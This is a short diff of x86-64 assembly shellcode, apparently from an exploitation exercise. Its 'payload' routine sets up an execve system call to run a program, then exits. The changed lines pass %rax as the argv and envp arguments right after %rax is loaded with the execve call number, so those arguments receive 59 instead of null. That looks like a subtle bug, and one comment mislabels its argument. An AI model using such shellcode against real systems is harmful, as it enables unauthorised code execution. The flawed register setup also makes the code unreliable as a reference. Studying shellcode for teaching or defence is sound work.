@@ -25,10 +25,10 @@ payload:
         xorq    %rax, %rax               /* get a 64-bit zero value */
         //movq    %rax, (ENVP)(%rcx)       /* set up null envp */
 
-        movq    $59, %rax        /* syscall arg 1: syscall number */
+        movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        movq    $0, %rsi               /* syscall arg 2: argv */
-        movq    $0, %rdx            /* syscall arg 3: envp */
+        movq    %rax, %rsi               /* syscall arg 2: argv */
+        movq    %rax, %rdx            /* syscall arg 3: envp */
         syscall                          /* invoke syscall */
 
         movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
